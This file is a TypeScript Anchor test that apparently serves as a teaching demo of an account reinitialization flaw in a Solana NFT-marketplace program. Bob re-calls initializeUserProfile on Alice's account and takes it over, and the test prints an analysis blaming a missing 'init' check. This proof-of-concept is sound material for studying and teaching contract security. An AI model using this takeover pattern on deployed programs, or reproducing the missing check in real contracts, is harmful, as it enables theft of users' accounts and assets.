import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Account1 } from "../target/types/account_1";
import { Keypair, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

describe("NFT Marketplace Account Initialization", () => {
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.account1 as Program<Account1>;
  const provider = anchor.getProvider();

  // Helper function to display program logs
  const showProgramLogs = async (txSig: string, description: string) => {
    console.log(`\n--- Program Logs for ${description} ---`);
    try {
      const tx = await provider.connection.getTransaction(txSig, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      });
      
      if (tx && tx.meta && tx.meta.logMessages) {
        tx.meta.logMessages.forEach(log => {
          if (log.includes("Program log:")) {
            console.log("📝", log.replace("Program log: ", ""));
          }
        });
      } else {
        console.log("⚠️  No logs found for this transaction");
      }
    } catch (error) {
      console.log("❌ Error retrieving logs:", error);
    }
    console.log("--- End Program Logs ---\n");
  };

  let alice: Keypair;
  let bob: Keypair;
  let aliceProfileAccount: Keypair;

  beforeEach(async () => {
    alice = Keypair.generate();
    bob = Keypair.generate();
    aliceProfileAccount = Keypair.generate();

    await provider.connection.requestAirdrop(alice.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(bob.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
    
    await new Promise(resolve => setTimeout(resolve, 1000));

    const space = 8 + 32 + 64 + 8 + 8 + 1;
    const createAccountTx = new anchor.web3.Transaction().add(
      SystemProgram.createAccount({
        fromPubkey: alice.publicKey,
        newAccountPubkey: aliceProfileAccount.publicKey,
        space: space,
        lamports: await provider.connection.getMinimumBalanceForRentExemption(space),
        programId: program.programId,
      })
    );

    await provider.sendAndConfirm(createAccountTx, [alice, aliceProfileAccount]);
  });

  it("should demonstrate account reinitialization vulnerability", async () => {
    console.log("Testing account initialization vulnerability");
    console.log("Alice:", alice.publicKey.toBase58());
    console.log("Bob:", bob.publicKey.toBase58());
    console.log("Profile account:", aliceProfileAccount.publicKey.toBase58());

    // Step 1: Alice initializes her profile
    console.log("\nStep 1: Alice creates her profile");
    const initTxSig = await program.methods
      .initializeUserProfile("alice_the_artist")
      .accounts({
        userProfile: aliceProfileAccount.publicKey,
        authority: alice.publicKey,
      })
      .signers([alice])
      .rpc();

    await showProgramLogs(initTxSig, "Profile Initialization");

    let profileData = await program.account.userProfile.fetch(aliceProfileAccount.publicKey);
    console.log("Profile created successfully");
    console.log("- Authority:", profileData.authority.toBase58());
    console.log("- Username:", profileData.username);
    console.log("- NFT Count:", profileData.nftCount.toString());
    
    expect(profileData.authority.toBase58()).to.equal(alice.publicKey.toBase58());
    expect(profileData.username).to.equal("alice_the_artist");

    // Step 2: Alice lists an NFT
    console.log("\nStep 2: Alice lists an NFT");
    const nftMint = Keypair.generate().publicKey;
    const listTxSig = await program.methods
      .listNft(new anchor.BN(1000000000), nftMint)
      .accounts({
        userProfile: aliceProfileAccount.publicKey,
        authority: alice.publicKey,
      })
      .signers([alice])
      .rpc();

    await showProgramLogs(listTxSig, "NFT Listing");

    profileData = await program.account.userProfile.fetch(aliceProfileAccount.publicKey);
    console.log("NFT listed successfully, count:", profileData.nftCount.toString());
    expect(profileData.nftCount.toString()).to.equal("1");

    // Step 3: Bob reinitializes Alice's profile
    console.log("\nStep 3: Bob attempts to reinitialize Alice's profile");
    const reinitTxSig = await program.methods
      .initializeUserProfile("bob_the_hacker")
      .accounts({
        userProfile: aliceProfileAccount.publicKey,
        authority: bob.publicKey,
      })
      .signers([bob])
      .rpc();

    await showProgramLogs(reinitTxSig, "Profile Reinitialization Attack");

    profileData = await program.account.userProfile.fetch(aliceProfileAccount.publicKey);
    console.log("Profile reinitialized by Bob");
    console.log("- New authority:", profileData.authority.toBase58());
    console.log("- New username:", profileData.username);
    console.log("- NFT count reset to:", profileData.nftCount.toString());
    
    expect(profileData.authority.toBase58()).to.equal(bob.publicKey.toBase58());
    expect(profileData.username).to.equal("bob_the_hacker");
    expect(profileData.nftCount.toString()).to.equal("0");

    // Step 4: Alice can no longer control her profile
    console.log("\nStep 4: Verifying Alice lost control");
    try {
      const failedTxSig = await program.methods
        .listNft(new anchor.BN(2000000000), Keypair.generate().publicKey)
        .accounts({
          userProfile: aliceProfileAccount.publicKey,
          authority: alice.publicKey,
        })
        .signers([alice])
        .rpc();
      
      throw new Error("Alice should not be able to list NFTs anymore");
    } catch (error) {
      console.log("Alice's transaction rejected:", error.message);
      expect(error.message).to.include("Unauthorized");
    }

    // Step 5: Bob can now control the profile
    console.log("\nStep 5: Bob can now control the profile");
    const bobListTxSig = await program.methods
      .listNft(new anchor.BN(3000000000), Keypair.generate().publicKey)
      .accounts({
        userProfile: aliceProfileAccount.publicKey,
        authority: bob.publicKey,
      })
      .signers([bob])
      .rpc();

    await showProgramLogs(bobListTxSig, "Bob's NFT Listing (Account Takeover)");

    profileData = await program.account.userProfile.fetch(aliceProfileAccount.publicKey);
    console.log("Bob successfully listed NFT, count:", profileData.nftCount.toString());
    expect(profileData.nftCount.toString()).to.equal("1");

    // Vulnerability Analysis
    console.log("\n=== VULNERABILITY ANALYSIS ===");
    console.log("Vulnerability: Account Reinitialization");
    console.log("- Missing 'init' constraint on user profile account");
    console.log("- No check if account is already initialized");
    console.log("- Anyone can overwrite existing account data");
    console.log("- Results in complete account takeover");
  });
});

